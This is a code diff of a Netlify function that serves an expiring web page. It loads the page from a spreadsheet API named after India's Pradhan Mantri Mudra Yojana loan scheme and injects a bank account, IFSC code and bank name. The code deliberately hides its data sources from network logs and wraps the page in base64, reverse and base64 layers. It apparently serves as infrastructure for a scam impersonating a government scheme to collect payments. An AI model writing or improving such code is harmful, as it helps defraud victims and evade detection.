@@ -1,118 +1,108 @@
 // netlify/functions/render.js
-// Node 18+ runtime on Netlify supports global fetch and Buffer.
-exports.handler = async function(event, context) {
-  const expiryId = "TRL"; // same id you used in PHP
-  const sheetbaseApiUrl = "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
-  const datetimeApiUrl  = "https://datetimeapi.vercel.app/api/datetime.js";
+// Serves the obfuscated HTML page (equivalent of your PHP output)
+// Node 18+ is assumed (global fetch). If your environment lacks fetch, uncomment the node-fetch fallback.
 
+const EXPIRY_ID = "TRL";
+const SHEETBASE_API = "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
+const DATETIME_API = "https://datetimeapi.vercel.app/api/datetime.js";
+
+async function fetchJson(url) {
+  // if global fetch not available in your runtime, uncomment this:
+  // const fetch = globalThis.fetch || (await import('node-fetch')).default;
+  const res = await fetch(url);
+  if (!res.ok) throw new Error(`Fetch failed ${url} -> ${res.status}`);
+  const text = await res.text();
+  // the datetime API returns JS that looks like JSON; attempt to parse JSON in text
   try {
-    // Fetch datetime (server-side so it will NOT appear in client network logs)
-    const tRes = await fetch(datetimeApiUrl);
-    if (!tRes.ok) {
-      return {
-        statusCode: 500,
-        headers: { "Content-Type": "text/html" },
-        body: "<h2>Datetime fetch error</h2>"
-      };
+    return JSON.parse(text);
+  } catch (e) {
+    // fallback: if it's JS wrapped, try to extract JSON between first { and last }
+    const first = text.indexOf('{'), last = text.lastIndexOf('}');
+    if (first >= 0 && last > first) {
+      return JSON.parse(text.slice(first, last + 1));
     }
-    // The vercel datetime endpoint returns JSON; try parse as JSON
-    const tjson = await tRes.json();
+    throw e;
+  }
+}
+
+exports.handler = async function (event, context) {
+  try {
+    const tjson = await fetchJson(DATETIME_API);
     if (!tjson || !tjson.datetime) {
       return {
         statusCode: 500,
-        headers: { "Content-Type": "text/html" },
-        body: "<h2>Datetime error</h2>"
+        headers: { 'content-type': 'text/html; charset=utf-8' },
+        body: '<h2>Datetime error</h2>'
       };
     }
     const serverDatetime = tjson.datetime;
 
-    // Fetch sheetbase JSON (server-side)
-    const sRes = await fetch(sheetbaseApiUrl);
-    if (!sRes.ok) {
+    const sheetResp = await fetch(SHEETBASE_API);
+    if (!sheetResp.ok) throw new Error('Sheetbase fetch failed');
+    const sheetText = await sheetResp.text();
+    const data = JSON.parse(sheetText);
+
+    let item = null;
+    if (!data || !Array.isArray(data.data)) {
       return {
         statusCode: 500,
-        headers: { "Content-Type": "text/html" },
-        body: "<h2>Sheetbase fetch error</h2>"
+        headers: { 'content-type': 'text/html; charset=utf-8' },
+        body: '<h2>Sheet data error</h2>'
       };
     }
-    const data = await sRes.json();
-
-    // Find the entry
-    let item = null;
-    if (data && Array.isArray(data.data)) {
-      for (const entry of data.data) {
-        if (String(entry.id) === String(expiryId)) {
-          item = entry;
-          break;
-        }
-      }
+    for (const entry of data.data) {
+      if (entry.id === EXPIRY_ID) { item = entry; break; }
     }
     if (!item) {
       return {
-        statusCode: 500,
-        headers: { "Content-Type": "text/html" },
-        body: "<h2>Entry missing</h2>"
+        statusCode: 404,
+        headers: { 'content-type': 'text/html; charset=utf-8' },
+        body: '<h2>Entry missing</h2>'
       };
     }
 
-    // Compare expiry: serverDatetime and item.date
-    // Use Date parsing like your PHP
-    const serverDT = new Date(serverDatetime);
-    const expiryDT = new Date(item.date);
-    if (isNaN(serverDT) || isNaN(expiryDT)) {
+    // expiry check
+    if (new Date(serverDatetime) > new Date(item.date)) {
       return {
-        statusCode: 500,
-        headers: { "Content-Type": "text/html" },
-        body: "<h2>Datetime parse error</h2>"
-      };
-    }
-    if (serverDT > expiryDT) {
-      return {
-        statusCode: 200,
-        headers: { "Content-Type": "text/html" },
-        body: "<h2>This Page is expired.</h2>"
+        statusCode: 403,
+        headers: { 'content-type': 'text/html; charset=utf-8' },
+        body: '<h2>This Page is expired.</h2>'
       };
     }
 
-    // Decode base64 fields (if present) exactly like your PHP did
-    const decodedHTML = item.html ? Buffer.from(item.html, "base64").toString("utf8") : "";
-    const decodedCSS  = item.css  ? Buffer.from(item.css,  "base64").toString("utf8") : "";
-    const decodedJS   = item.init ? Buffer.from(item.init, "base64").toString("utf8") : "";
-
-    // Build the "fullPage" same structure as your PHP version.
-    // We'll inline CSS and JS so Netlify server returns a single payload,
-    // and the client won't see the sheetbase or datetime URLs.
+    // decode item html/css/js (they are base64 in your system)
+    const decodedHTML = item.html ? Buffer.from(item.html, 'base64').toString('utf8') : '';
+    // we'll link to /style.css and /init.js (these will be routed to functions)
     const fullPage = `
-<link rel='stylesheet' href="functions/style.css">
+<link rel='stylesheet' href="/style.css">
 <script>
 window.SERVER_EXPIRY = ${JSON.stringify(item.date)};
 window.SERVER_TIME   = ${JSON.stringify(serverDatetime)};
-window.SERVER_ACC    = ${JSON.stringify(item.acc ?? "")};
-window.SERVER_IFSC   = ${JSON.stringify(item.ifsc ?? "")};
-window.SERVER_BANK   = ${JSON.stringify(item.bank ?? "")};
+window.SERVER_ACC    = ${JSON.stringify(item.acc ?? '')};
+window.SERVER_IFSC   = ${JSON.stringify(item.ifsc ?? '')};
+window.SERVER_BANK   = ${JSON.stringify(item.bank ?? '')};
 </script>
 
-<style>
-${decodedCSS}
-</style>
-
 <script>
-${decodedJS}
+document.addEventListener('DOMContentLoaded', function() {
+    const s = document.createElement('script');
+    s.src = '/init.js';
+    s.onload = function() {
+        if (typeof initializePage === 'function') initializePage();
+    };
+    document.head.appendChild(s);
+});
 </script>
 
 ${decodedHTML}
 `;
 
-    // Triple-layer encode so client receives same behavior:
-    // layerA = base64(fullPage)
-    // layerB = reverse(layerA)
-    // layerC = base64(layerB)
-    const layerA = Buffer.from(fullPage, "utf8").toString("base64");
-    const layerB = layerA.split("").reverse().join("");
-    const layerC = Buffer.from(layerB, "utf8").toString("base64");
+    // Layering: base64 -> reverse -> base64 (same as your PHP)
+    const layerA = Buffer.from(fullPage, 'utf8').toString('base64');
+    const layerB = layerA.split('').reverse().join('');
+    const layerC = Buffer.from(layerB, 'utf8').toString('base64');
 
-    // Construct the HTML that client will receive (same as your PHP final document)
-    const finalResponse = `<!DOCTYPE html>
+    const page = `<!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
@@ -120,7 +110,7 @@ ${decodedHTML}
 <script>
 (function(){
     try {
-        const payload = ${JSON.stringify(layerC)};
+        const payload = "${layerC}";
         const step1 = atob(payload);
         const step2 = step1.split('').reverse().join('');
         const finalHtml = atob(step2);
@@ -141,16 +131,16 @@ ${decodedHTML}
 
     return {
       statusCode: 200,
-      headers: { "Content-Type": "text/html; charset=utf-8" },
-      body: finalResponse
+      headers: { 'content-type': 'text/html; charset=utf-8' },
+      body: page
     };
 
   } catch (err) {
     console.error(err);
     return {
       statusCode: 500,
-      headers: { "Content-Type": "text/html" },
-      body: "<h2>Server error</h2>"
+      headers: { 'content-type': 'text/html; charset=utf-8' },
+      body: `<h2>Server error</h2><pre>${String(err.message)}</pre>`
     };
   }
 };
